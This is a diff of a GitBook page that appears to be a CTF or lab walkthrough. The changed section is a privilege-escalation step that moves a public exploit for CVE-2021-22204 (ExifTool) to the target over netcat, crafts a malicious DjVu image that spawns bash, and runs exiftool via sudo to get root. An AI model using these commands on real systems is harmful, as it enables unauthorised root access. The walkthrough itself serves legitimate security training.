@@ -205,23 +205,37 @@ sudo -l
 
 <figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
-## Netcat
+## Privilege Escalation
 
-**Kali(receiving)**
+**Exploit:** [https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py](https://github.com/convisolabs/CVE-2021-22204-exiftool/blob/master/exploit.py)
 
-```
-nc -l -p 1234 > cve.py
-```
-
-**Victim(sending)**
+**Victim(receiving)**
 
 ```
-nc -w 3 10.10.198.113 1234 < cve.py
+nc -l -p 1234 > cve.tar.gz
 ```
 
+**Kali(sending)**
 
+```
+git clone https://github.com/se162xg/CVE-2021-22204.git
+tar cvf cve.tar.gz  CVE-2021-22204/
+nc -w 3 $VICTIM 1234 < cve.tar.gz
+```
 
+**Victim**
 
+```
+tar xvf cve.tar.gz 
+cd CVE-2021-22204
+```
 
+**Victim**
 
+```
+bash craft_a_djvu_exploit.sh '/bin/bash'
+sudo /usr/local/bin/exiftool delicate.jpg 
+```
+
+<figure><img src="../../.gitbook/assets/image (772).png" alt=""><figcaption></figcaption></figure>
 
